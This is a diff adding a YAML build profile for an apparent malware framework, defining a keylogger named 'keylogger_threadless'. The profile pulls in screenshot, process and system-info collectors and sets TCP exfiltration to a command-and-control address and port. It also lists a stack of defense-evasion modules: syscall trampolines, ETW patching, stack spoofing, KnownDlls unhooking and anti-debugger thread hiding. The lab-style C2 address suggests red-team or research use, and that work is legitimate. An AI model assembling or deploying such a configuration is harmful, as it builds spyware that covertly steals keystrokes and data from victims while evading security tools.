@@ -1,0 +1,29 @@
+name: keylogger_threadless
+description: "Keylogger with syscall trampoline, Lazarus fiber sleep, KnownDlls unhooking, ThreadHideFromDebugger"
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/screenshot
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+api_resolve: api_resolve/ldr_get_proc
+resources: true
+
+evasion:
+  - evasion/syscall_trampoline
+  - evasion/sleep_lazarus
+  - evasion/etw_full_patch
+  - evasion/stack_spoof
+  - evasion/unhook_knowndlls
+  - evasion/anti_debug_thread_hide
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
